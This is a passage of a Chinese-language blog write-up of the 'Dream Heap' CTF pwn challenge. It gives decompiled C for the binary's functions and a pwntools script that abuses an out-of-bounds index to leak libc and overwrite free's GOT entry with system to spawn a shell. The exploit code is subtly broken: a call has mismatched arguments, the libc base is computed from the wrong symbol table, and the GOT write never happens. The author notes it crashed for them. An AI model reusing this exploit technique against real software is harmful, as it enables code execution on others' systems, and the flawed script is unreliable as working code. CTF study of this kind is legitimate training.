class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/andy/Workspace/nightmare/dream_heap/dream_heaps&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">===========================================================</span><br><span class="line">dream_heaps: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=9968ee0656a4b24cb6bf5ebc1f8f37d4ddd0078d, not stripped</span><br><span class="line">===========================================================</span><br><span class="line">Online dream catcher! Write dreams down and come back to them later!</span><br><span class="line"></span><br><span class="line">What would you like to do?</span><br><span class="line">1: Write dream</span><br><span class="line">2: Read dream</span><br><span class="line">3: Edit dream</span><br><span class="line">4: Delete dream</span><br><span class="line">5: Quit</span><br><span class="line">&gt; 1</span><br><span class="line">How long is your dream?</span><br><span class="line">100</span><br><span class="line">What are the contents of this dream?</span><br><span class="line">Hello</span><br><span class="line">What would you like to do?</span><br><span class="line">1: Write dream</span><br><span class="line">2: Read dream</span><br><span class="line">3: Edit dream</span><br><span class="line">4: Delete dream</span><br><span class="line">5: Quit</span><br><span class="line">&gt; 2</span><br><span class="line">Which dream would you like to read?</span><br><span class="line">0</span><br><span class="line">Hello</span><br><span class="line">What would you like to do?</span><br><span class="line">1: Write dream</span><br><span class="line">2: Read dream</span><br><span class="line">3: Edit dream</span><br><span class="line">4: Delete dream</span><br><span class="line">5: Quit</span><br><span class="line">&gt; 3</span><br><span class="line">Which dream would you like to change?</span><br><span class="line">0</span><br><span class="line">Hello World</span><br><span class="line">What would you like to do?</span><br><span class="line">1: Write dream</span><br><span class="line">2: Read dream</span><br><span class="line">3: Edit dream</span><br><span class="line">4: Delete dream</span><br><span class="line">5: Quit</span><br><span class="line">&gt; 2</span><br><span class="line">Which dream would you like to read?</span><br><span class="line">0</span><br><span class="line">Hello World</span><br><span class="line">What would you like to do?</span><br><span class="line">1: Write dream</span><br><span class="line">2: Read dream</span><br><span class="line">3: Edit dream</span><br><span class="line">4: Delete dream</span><br><span class="line">5: Quit</span><br><span class="line">&gt; </span><br></pre></td></tr></table></figure>
+<p>简单来说就是可以自己声明有多长的内容要记录，然后系统将内容保存到申请的堆空间里面，并不是直接写入硬盘；</p>
+<p>这里是对于<code>main</code>函数进行的反编译</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">long</span> in_FS_OFFSET;</span><br><span class="line">  undefined4 option;</span><br><span class="line">  undefined8 canary;</span><br><span class="line">  </span><br><span class="line">  canary = *(undefined8 *)(in_FS_OFFSET + <span class="number">0x28</span>);</span><br><span class="line">  local_14 = <span class="number">0</span>;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>,(<span class="type">char</span> *)<span class="number">0x0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Online dream catcher! Write dreams down and come back to them later!\n&quot;</span>);</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What would you like to do?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1: Write dream&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2: Read dream&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3: Edit dream&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;4: Delete dream&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;5: Quit\n&gt; &quot;</span>);</span><br><span class="line">  __isoc99_scanf(&amp;DAT_00400c20,&amp;option);</span><br><span class="line">  <span class="keyword">switch</span>(option) &#123;</span><br><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Not an option!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">    new_dream();</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">    read_dream();</span><br><span class="line">  <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">    edit_dream();</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">    delete_dream();</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                  <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">while</span>( <span class="literal">true</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>其中<code>new_dream</code>函数是允许我们进行写的，所以我们切入点就在这里，对应的反编译</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">new_dream</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">long</span> in_FS_OFFSET;</span><br><span class="line">  <span class="type">int</span> sizePtr;</span><br><span class="line">  <span class="type">void</span> *heapPtr;</span><br><span class="line">  <span class="type">long</span> canary;</span><br><span class="line">  </span><br><span class="line">  canary = *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>);</span><br><span class="line">  sizePtr = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;How long is your dream?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(&amp;DAT_00400c20,&amp;sizePtr);</span><br><span class="line">  heapPtr = <span class="built_in">malloc</span>((<span class="type">long</span>)sizePtr);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What are the contents of this dream?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>,heapPtr,(<span class="type">long</span>)sizePtr);</span><br><span class="line">  *(<span class="type">void</span> **)(HEAP_PTRS + (<span class="type">long</span>)INDEX * <span class="number">8</span>) = heapPtr;</span><br><span class="line">  *(<span class="type">int</span> *)(SIZES + (<span class="type">long</span>)INDEX * <span class="number">4</span>) = sizePtr;</span><br><span class="line">  INDEX = INDEX + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (canary != *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>)) &#123;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    __stack_chk_fail();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个函数还是比较好理解的就不多讲解了；其中有两个bss段地址，<code>HEAP_PTRS=0x06020a0</code>，<code>SIZE=0x06020e0</code>，<code>INDEX=0x060208c</code></p>
+<p>那么接下来我在看我们可以控制读的函数<code>read_dream</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">read_dream</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">long</span> in_FS_OFFSET;</span><br><span class="line">  <span class="type">int</span> num;</span><br><span class="line">  undefined8 dreamPtr;</span><br><span class="line">  <span class="type">long</span> canary;</span><br><span class="line">  </span><br><span class="line">  canary = *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Which dream would you like to read?&quot;</span>);</span><br><span class="line">  num = <span class="number">0</span>;</span><br><span class="line">  __isoc99_scanf(&amp;DAT_00400c20,&amp;num);</span><br><span class="line">  <span class="keyword">if</span> (INDEX &lt; num) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Hmm you skipped a few nights...&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    dreamPtr = *(undefined8 *)(HEAP_PTRS + (<span class="type">long</span>)num * <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,dreamPtr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (canary != *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>)) &#123;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    __stack_chk_fail();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个函数提示我们输入<code>num</code>的值来获取到<code>dreamPtr</code>的地址；这里简单的做了一个越界检查，检测到我们输入的num数大于了我们正常存储的INDEX数量后就会输出<code>Hmm you skipped a few nights...</code>，我说过了这只是一个简单的越界检查，所以我们还是可以读取到bss segement<code>HEAP_PTR</code>之前的内容</p>
+<p>接下来看编辑函数<code>edit_dream</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">edit_dream</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">long</span> in_FS_OFFSET;</span><br><span class="line">  <span class="type">int</span> num;</span><br><span class="line">  <span class="type">int</span> sizePtr;</span><br><span class="line">  <span class="type">void</span> *dreamPtr;</span><br><span class="line">  <span class="type">long</span> canary;</span><br><span class="line">  </span><br><span class="line">  canary = *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Which dream would you like to change?&quot;</span>);</span><br><span class="line">  num = <span class="number">0</span>;</span><br><span class="line">  __isoc99_scanf(&amp;DAT_00400c20,&amp;num);</span><br><span class="line">  <span class="keyword">if</span> (INDEX &lt; num) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You haven\&#x27;t had this dream yet...&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    dreamPtr = *(<span class="type">void</span> **)(HEAP_PTRS + (<span class="type">long</span>)num * <span class="number">8</span>);</span><br><span class="line">    sizePtr = *(<span class="type">int</span> *)(SIZES + (<span class="type">long</span>)num * <span class="number">4</span>);</span><br><span class="line">    read(<span class="number">0</span>,dreamPtr,(<span class="type">long</span>)sizePtr);</span><br><span class="line">    *(undefined *)((<span class="type">long</span>)dreamPtr + (<span class="type">long</span>)sizePtr) = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (canary != *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>)) &#123;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    __stack_chk_fail();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>关于<code>delete_dream</code>函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">delete_dream</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">long</span> lVar1;</span><br><span class="line">  <span class="type">long</span> in_FS_OFFSET;</span><br><span class="line">  <span class="type">int</span> index;</span><br><span class="line">  <span class="type">long</span> canary;</span><br><span class="line"> </span><br><span class="line">  lVar1 = *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Which dream would you like to delete?&quot;</span>);</span><br><span class="line">  index = <span class="number">0</span>;</span><br><span class="line">  __isoc99_scanf(&amp;DAT_00400b60,&amp;index);</span><br><span class="line">  <span class="keyword">if</span> (INDEX &lt; index) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Nope, you can\&#x27;t delete the future.&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">free</span>(*(<span class="type">void</span> **)(HEAP_PTRS + (<span class="type">long</span>)index * <span class="number">8</span>));</span><br><span class="line">    *(undefined8 *)(HEAP_PTRS + (<span class="type">long</span>)index * <span class="number">8</span>) = <span class="number">0</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (lVar1 != *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>)) &#123;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    __stack_chk_fail();</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>也是很简单的获取字符串ptr和存储大小ptr，然后分别进行释放和数字覆盖</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">p=process(&#x27;./dream_heaps&#x27;)</span><br><span class="line">elf=ELF(&#x27;./dream_heaps&#x27;)</span><br><span class="line">libc=ELF(&#x27;/usr/lib/libc.so.6&#x27;)</span><br><span class="line"></span><br><span class="line">system = libc.sym[&#x27;system&#x27;]</span><br><span class="line">puts = libc.sym[&#x27;puts&#x27;]</span><br><span class="line">bss_SIZE = 0x06020e0</span><br><span class="line">bss_HEAP_PTRS = 0x06020a0</span><br><span class="line">bss_INDEX = 0x060208c</span><br><span class="line"></span><br><span class="line">def write(content,size):</span><br><span class="line">    p.sendlineafter(b&#x27;&gt;&#x27;,b&#x27;1&#x27;);</span><br><span class="line">    p.sendlineafter(b&#x27;dream?&#x27;,str(size));</span><br><span class="line">    p.sendlineafter(b&#x27;dream?&#x27;,content);</span><br><span class="line">def read(index):</span><br><span class="line">    p.sendlineafter(b&#x27;&gt;&#x27;,b&#x27;2&#x27;)</span><br><span class="line">    p.sendlineafter(b&#x27;read?&#x27;,str(index))</span><br><span class="line">    leak = p.recvuntil(b&#x27;What&#x27;)</span><br><span class="line">    #Delete trash data</span><br><span class="line">    leak = leak.replace(b&#x27;What&#x27;,b&quot;&quot;)</span><br><span class="line">    leak = leak.replace(b&#x27;\x0a&#x27;,b&quot;&quot;)</span><br><span class="line">    leak = leak.ljust(8,b&#x27;\x00&#x27;)</span><br><span class="line">    leak = u64(leak)</span><br><span class="line">    log.info(&quot;Leak:&quot;+hex(leak))</span><br><span class="line">    return leak</span><br><span class="line">def edit(index,content):</span><br><span class="line">    p.sendlineafter(b&#x27;&gt;&#x27;,b&#x27;3&#x27;)</span><br><span class="line">    p.sendlineafter(b&#x27;change?&#x27;,str(index))</span><br><span class="line">    p.sendline(content[:6])</span><br><span class="line">def delete(index):</span><br><span class="line">    p.sendlineafter(b&#x27;&gt;&#x27;,b&#x27;4&#x27;)</span><br><span class="line">    p.sendlineafter(b&#x27;delete?&#x27;,str(index))</span><br><span class="line"></span><br><span class="line">offset = bss_HEAP_PTRS - elf.sym[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line">log.info(&quot;leak puts address payload:&quot;+str(-offset//8))</span><br><span class="line">puts_addr=read(-offset//8)</span><br><span class="line">libc_base=puts_addr-elf.sym[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line">write(b&#x27;/bin/sh\x00&#x27;,0x10)</span><br><span class="line">write(b&#x27;0&#x27;*10, 0x20)</span><br><span class="line">write(b&#x27;0&#x27;*10, 0x30)</span><br><span class="line">write(b&#x27;0&#x27;*10, 0x40)</span><br><span class="line">write(b&#x27;0&#x27;*10, 0x50)</span><br><span class="line">write(b&#x27;0&#x27;*10, 0x60)</span><br><span class="line">write(b&#x27;0&#x27;*10, 0x70)</span><br><span class="line">write(b&#x27;0&#x27;*10, 0x80)</span><br><span class="line">write(b&#x27;0&#x27;*10, 0x90)</span><br><span class="line">write(b&#x27;0&#x27;*10, 0xa0)</span><br><span class="line">write(b&#x27;0&#x27;*10, 0xb0)</span><br><span class="line">write(b&#x27;0&#x27;*10, 0xc0)</span><br><span class="line">write(b&#x27;0&#x27;*10, 0xd0)</span><br><span class="line">write(b&#x27;0&#x27;*10, 0xe0)</span><br><span class="line">write(b&#x27;0&#x27;*10, 0xf0)</span><br><span class="line">write(b&#x27;0&#x27;*10, 0x11)</span><br><span class="line">write(b&#x27;0&#x27;*10, 0x22)</span><br><span class="line">write(b&#x27;0&#x27;*10, 0x18)</span><br><span class="line">write(b&#x27;0&#x27;*10, elf.got[&#x27;free&#x27;])</span><br><span class="line">write(b&#x27;0&#x27;*10, 00)</span><br><span class="line"></span><br><span class="line">edit(b&#x27;0&#x27;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>这里wp是nightmare上的不知道是不是libc版本的原因，我在利用<code>index abuse</code>的时候，只要我的负数过大就会出现<code>segmentation fault (core dumped)  ./dream_heaps</code></p>
+<p>所以直接说思路了，就是直接利用数组越界漏洞泄露出<code>puts</code>函数的真实地址，然后计算出libc_base的地址好让我们可以运行system函数，然后我们再把<code>/bin/sh\x00</code>写入bss段，把<code>free</code>GOT表覆盖为system的真实地址，我们在释放index处的堆空间的时候就会执行<code>system(&quot;/bin/sh&quot;);</code>，当然这里的index就是shell字段</p>
+<p>我发现这样整段整段记录一大堆题目效率确实是低，一般的时间都在写过程，留给我思考的时间非常少，所以之后我都尽量避免写全过程，抓重点记录知识点</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%83%E4%B9%A0"><span class="toc-number">1.</span> <span class="toc-text"> 练习</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#backdoor-ctf-bbpwn"><span class="toc-number">1.1.</span> <span class="toc-text"> Backdoor CTF bbpwn</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tokyo-2016-greeting"><span class="toc-number">1.2.</span> <span class="toc-text"> Tokyo 2016 Greeting</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#csaw-doubletrouble"><span class="toc-number">1.3.</span> <span class="toc-text"> CSAW doubletrouble</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dream-heap"><span class="toc-number">1.4.</span> <span class="toc-text"> Dream Heap</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/01/16/pwn-commonly-break-2/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/01/16/pwn-commonly-break-2/&text=pwn commonly training 2"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/01/16/pwn-commonly-break-2/&title=pwn commonly training 2"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/01/16/pwn-commonly-break-2/&is_video=false&description=pwn commonly training 2"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=pwn commonly training 2&body=Check out this article: http://example.com/2023/01/16/pwn-commonly-break-2/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/01/16/pwn-commonly-break-2/&title=pwn commonly training 2"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/01/16/pwn-commonly-break-2/&title=pwn commonly training 2"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/01/16/pwn-commonly-break-2/&title=pwn commonly training 2"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/01/16/pwn-commonly-break-2/&title=pwn commonly training 2"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/01/16/pwn-commonly-break-2/&name=pwn commonly training 2&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/01/16/pwn-commonly-break-2/&t=pwn commonly training 2"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022-2023
+    Andy
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/links/">Links</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
